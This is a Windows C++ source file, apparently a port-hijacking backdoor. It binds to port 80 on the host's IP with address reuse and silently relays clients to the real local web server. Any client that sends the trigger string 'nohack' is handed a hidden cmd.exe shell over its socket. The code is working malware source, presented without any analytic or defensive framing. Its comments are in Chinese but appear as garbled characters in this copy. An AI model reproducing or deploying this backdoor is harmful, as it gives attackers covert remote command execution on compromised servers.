// fu.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <winsock2.h>
#pragma comment(lib,"ws2_32")
#include <stdio.h>
int cmdshell(SOCKET s)
{   	
	STARTUPINFO si;
	GetStartupInfo(&si);
    si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow=SW_HIDE;
	//ʹcmd���������ֱ�Ӻ�socket����
	si.hStdInput=si.hStdOutput=si.hStdError=(void*)s;
	char cmdline[256];
	//�õ�cmd·��
	GetSystemDirectory(cmdline,sizeof(cmdline));
	strcat(cmdline,"\\cmd.exe");
	PROCESS_INFORMATION ProcessInformation;
	int ret;
	//����cmd����
	ret=CreateProcess(NULL,cmdline,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
	//�ȴ����̽���
	WaitForSingleObject(ProcessInformation.hProcess,INFINITE);
    CloseHandle(ProcessInformation.hProcess);	
	return 0;
}


DWORD WINAPI ThreadProc(LPVOID lpParam) 
{ 
	SOCKET sClient = (SOCKET)lpParam; 
	SOCKET sNative; 
	char buff[4096]={0}; 
	SOCKADDR_IN saddr; 
	DWORD val; 
	saddr.sin_family = AF_INET; 
	//����Ҫ���ӵĻػ���ַ
	saddr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1"); 
	saddr.sin_port = htons(80); 
	//�����׽���
	if((sNative=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==SOCKET_ERROR) 
	{ 
		printf("socket error\n"); 
		return 0; 
	} 
	val = 100; 
	//�����շ����ݳ�ʱʱ��
	if(setsockopt(sNative,SOL_SOCKET,SO_RCVTIMEO,(char *)&val,sizeof(val))!=0) 
	{ 
		printf("setsockopt sNative error \n");
		return 0; 
	} 
	if(setsockopt(sClient,SOL_SOCKET,SO_RCVTIMEO,(char *)&val,sizeof(val))!=0) 
	{ 
		printf("setsockopt sClient failed \n");
		return 0; 
	} 
	//����127.0.0.1��80�˿�
	if(connect(sNative,(SOCKADDR *)&saddr,sizeof(saddr))!=0) 
	{ 
		printf("connect sNative failed\n"); 
		closesocket(sNative); 
		closesocket(sClient); 
		return 0; 
	} 
	DWORD ret; 
	//ѭ�����մӿͻ����������ݣ�����127.0.0.1�����ж������ַ�
	//ͬʱ�Ѵ�127.0.0.1�յ������ݷ����ͻ�
	while(TRUE) 
	{ 
		//���մӿͻ���������
		ret = recv(sClient,buff,4096,0); 
		if(ret>0) 
		{   //�ж������ַ�������ͬ����ú��ź���	
			if(strncmp(buff,"nohack",6)==0)
			{
				cmdshell(sClient);
                break;
			}
			//���͸�127.0.0.1
			send(sNative,buff,ret,0); 
		}
		else if(ret==SOCKET_ERROR) 
			break; 
		//���մ�127.0.0.1��������
		ret = recv(sNative,buff,4096,0); 
		if(ret>0) 
			//���͸��ͻ�
			send(sClient,buff,ret,0); 
		else if(ret==SOCKET_ERROR) 
			break; 
	} 
	closesocket(sClient); 
	closesocket(sNative); 
	return 0 ; 
} 



int main(int argc, char* argv[])
{		
	char szHost[256];
	sockaddr_in saddr; 
	sockaddr_in caddr;  
	SOCKET sListen; 
	SOCKET sClient[1000]; 
	WSADATA wsaData;
	WORD sockVersion = MAKEWORD(2, 2);
	//����winsock��
	if(WSAStartup(sockVersion, &wsaData) != 0)
        return 0;
	//�õ����ص�һ��������IP
	gethostname(szHost, 256);
	hostent *pHost = gethostbyname(szHost);
	in_addr addr;
	memcpy(&addr.S_un.S_addr, pHost->h_addr_list[0], pHost->h_length);
	saddr.sin_family = AF_INET; 
	//����Ҫ�󶨵�IP��ַ������IP
	saddr.sin_addr.S_un.S_addr =addr.S_un.S_addr; 
	saddr.sin_port = htons(80); 
	//�����׽���
	sListen=WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);;
	if(sListen==SOCKET_ERROR)
	{ 
		printf("WSASocket error \n"); 
		return 0; 
	} 
	int val=1;  
	//�����׽���Ϊ�����ظ��󶨶˿�
	if(setsockopt(sListen,SOL_SOCKET,SO_REUSEADDR,(char *)&val,sizeof(val))!=0) 
	{ 
		printf("setsockopt error\n"); 
		return 0; 
	} 
	//���׽��ֵ�����IP��
	if(bind(sListen,(SOCKADDR *)&saddr,sizeof(saddr))==SOCKET_ERROR) 
	{ 
		printf("bind error \n"); 
		return 0; 
	} 
	//�����׽���
	listen(sListen,1000); 
	DWORD ThreadId;
	HANDLE hThread;
	for (int i=0;i<1000;i++)
	{ 
		int Addrsize = sizeof(caddr); 
		//����������
		sClient[i] = accept(sListen,(struct sockaddr *)&caddr,&Addrsize); 
		printf("%s\n",inet_ntoa(caddr.sin_addr));
		if(sClient[i]!=INVALID_SOCKET) 
		{ 	
			//�������߳�
			hThread = CreateThread(NULL,0,ThreadProc,(LPVOID)sClient[i],0,&ThreadId); 
			if(hThread==NULL) 
			{ 
				printf("CreateThread error"); 
				break; 
			} 
		} 
		CloseHandle(hThread); 
	} 
	closesocket(sListen); 
	WSACleanup(); 
	return 0; 
} 
